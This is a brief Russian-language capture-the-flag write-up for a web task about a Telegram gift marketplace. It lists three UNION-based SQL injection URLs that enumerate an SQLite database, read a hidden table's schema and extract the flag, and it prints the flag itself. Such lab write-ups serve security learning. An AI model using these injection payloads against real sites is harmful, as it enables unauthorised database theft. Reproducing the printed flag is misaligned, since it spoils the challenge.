## Описание

Плюшевый Пепе создал свой маркетплейс подарков в телеграме. Но он неуверен, что сайт полностью безопасен...

## Решение

https://t.me/bug_makers/149

Посылаем GET запрос через постман и узнаем полный список таблиц в БД:
```
http://tasks.duckerz.ru:30071/?category=' UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table'--
```
Среди всего списка самая интересная таблица – это s3cret, изучаем ее структуру с помощью запроса:
```
http://tasks.duckerz.ru:30071/?category=' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE type='table' AND name='s3cret'--
```
Получаем флаг:
```
http://tasks.duckerz.ru:30071/?category=' UNION SELECT 1,fl4g,3,4 FROM s3cret --
```
DUCKERZ{Plush_P3P3_w0nt_l3t_g0_of_h1s_H34RT}
